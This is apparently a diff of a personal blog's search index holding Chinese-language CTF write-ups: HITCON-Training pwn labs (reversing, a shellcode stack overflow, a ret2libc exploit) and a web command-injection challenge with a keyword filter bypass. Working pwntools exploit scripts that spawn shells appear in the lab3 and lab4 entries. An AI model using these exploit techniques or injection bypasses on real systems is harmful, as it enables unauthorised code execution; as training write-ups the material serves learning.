@@ -1,6 +1,147 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hitcon lab1</title>
+    <url>/2019/04/17/Hitcon-lab1/</url>
+    <content><![CDATA[<p>做为一个刚开始学习pwn的小白，很多地方都不会，DALAO勿喷…</p>
+<pre><code>Hitcon这个是le3ding大佬推给我的
+
+
+这个是GitHub地址 https://github.com/scwuaptx/HITCON-Training 有需要的可以自己git
+
+
+——————————分割线——————————
+
+lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb用法
+
+用ida打开可以看到get_flag这个函数</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71ac83b8f4.png" alt></p>
+<pre><code>然后查看sysmagic.c文件</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71f4f9d05f.png" alt></p>
+<pre><code>经过观察，flag的生成与输入无关，因此可以通过调试直接获得flag
+
+将if(password == magic)改为if(password ！= magic)
+
+运行./sysmagic</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb7219445d51.png" alt></p>
+]]></content>
+      <categories>
+        <category>逆向学习</category>
+      </categories>
+      <tags>
+        <tag>Hitcon</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hitcon_lab4</title>
+    <url>/2019/04/24/Hitcon-lab4/</url>
+    <content><![CDATA[<p>lab4是一道 return to libc 的题，</p>
+<pre><code>首先checksec一下</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc067abaa659.png" alt></p>
+<pre><code>可以看到没有开栈保护，开了NX了，可以栈溢出
+
+file 一下 ret2lib ，返回32位
+
+用ida打开文件分析一下</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc068d80b6c5.png" alt></p>
+<pre><code>这里两个地方值得注意：
+    1、see_something()这个函数可以将你输入的地址找到其在运行中的真实地址
+
+    2、像read，puts这样简单的函数可以被用来寻找偏移量
+
+通过这两点可以用see_something()这个函数，将puts函数的真实地址返回出来
+
+接下来就是找到libc的真实地址，计算偏移量，然后计算出system的真实地址，最后是计算出&quot;bin/sh&quot;真实地址拿到shell
+
+exp：
+
+#-*-coding:utf8-*-
+from pwn import *
+
+io = process(&quot;./ret2lib&quot;)
+elf = ELF(&quot;./ret2lib&quot;)
+
+libc = ELF(&quot;/lib32/libc.so.6&quot;)
+
+puts_libc = libc.symbols[&quot;puts&quot;]
+print &quot;puts_libc&quot; + hex(puts_libc) 
+
+system_libc = libc.symbols[&quot;system&quot;]
+
+binsh_libc = libc.search(&apos;/bin/sh&apos;).next()
+print &quot;binsh_libc&quot; + hex(binsh_libc)
+
+puts_plt = elf.plt[&quot;puts&quot;]
+print &quot;puts_plt:&quot; + hex(puts_plt)
+
+puts_got = elf.got[&quot;puts&quot;]
+print &quot;puts_got:&quot; + hex(puts_got)
+
+io.recvuntil(&quot;:&quot;)
+io.sendline(str(puts_got))
+
+io.recvuntil(&apos;0x&apos;)
+puts_addr = int(io.reuntil(&apos;\n&apos;),16)
+print &quot;puts_addr:&quot; + hex(puts_addr) //获得puts地址
+
+main = 0x0804857d  //通过ida找出mian的地址
+
+offset = puts_addr - puts_libc  //计算偏移量
+system_addr = system_libc + offset  //system地址
+binsh =  binsh_libc + offset  // bin/sh地址
+
+io.recvuntil(&quot;:&quot;)
+payload = &apos;a&apos; * 60
+payload += p32(system_addr) + p32(main) + p32(binsh)
+
+
+io.sendline(payload)
+io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3cdfb2d.png" alt></p>
+<pre><code>拿到shell</code></pre>]]></content>
+      <categories>
+        <category>逆向学习</category>
+      </categories>
+      <tags>
+        <tag>Hitcon</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hitcon  lab3 </title>
+    <url>/2019/04/18/hitcon-lab3/</url>
+    <content><![CDATA[<p>lab3这道题是一个基本的栈溢出</p>
+<pre><code>先用ida分析ret2sc文件</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87b3a035c1.png" alt></p>
+<pre><code>程序显示先是read &quot;&amp;name&quot;，然后溢出v4的缓冲区，
+
+由此我们可以将shellcode跳转到name的地址去执行，然后得到shel，这是基本思路
+
+首先看一下&amp;name的地址，双击&amp;name可以看到</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87ddce5128.png" alt></p>
+<pre><code>地址为0x0804A060
+
+直接上exp：
+
+from pwn import *
+
+&apos;&apos;&apos;A)AA found at offset: 32&apos;&apos;&apos;
+
+context.log_level = &apos;debug&apos;
+
+io = process(&apos;ret2sc&apos;)
+
+sc = asm(shellcraft.sh())
+
+ret2 = &apos;A&apos;*32 + p32(0x0804A060)
+
+io.sendafter(&apos;Name:&apos;,sc)
+
+io.sendafter(&apos;best:&apos;,ret2)
+
+io.interactive()
+
+直接运行  </code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87f55ab5e5.png" alt></p>
+<pre><code>ok，拿到shell，直接cat flag就行了</code></pre>]]></content>
+      <categories>
+        <category>逆向学习</category>
+      </categories>
+      <tags>
+        <tag>Hitcon</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>test</title>
     <url>/2020/07/24/test/</url>
     <content><![CDATA[<p>11111111</p>
@@ -11,6 +152,37 @@
       <tags>
         <tag>test1</tag>
         <tag>test2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>calc2</title>
+    <url>/2019/04/19/calc2/</url>
+    <content><![CDATA[<p>今天做了一个web题，emmmm，以前没有遇到过，涨姿势。。。</p>
+<pre><code>http://139.224.220.67:30008，这个是六星战队的一个ctf联系平台</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb999e4ed8ea.png" alt></p>
+<pre><code>首先是 shell_exec（） 这个函数，百度查了一下，命令执行，emmm</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99b6feb0c6.png" alt></p>
+<pre><code>首先是将输入的 &amp;str 传入 bc 再通过shell_exec() 执行，再echo回显出来</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ce305a30.png" alt></p>
+<pre><code>ls一下看到了当前文件夹下的文件，flag就在里面
+
+接着打算直接cat flag，然而并不行
+
+if(!empty($_GET)){
+$str=$_GET[&quot;calc&quot;];
+if(strpos($str,&quot;#&quot;)!==false)
+    die;
+if(strpos($str,&quot;`&quot;)!==false)
+    die;
+if(strpos($str,&quot;flag&quot;)!==false)
+    die;
+
+成了,flag被过滤了
+
+嗯，换一个命令 grep </code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ebfcf1e8.png" alt></p>
+<pre><code>拿到flag</code></pre>]]></content>
+      <categories>
+        <category>CTF学习</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
       </tags>
   </entry>
 </search>
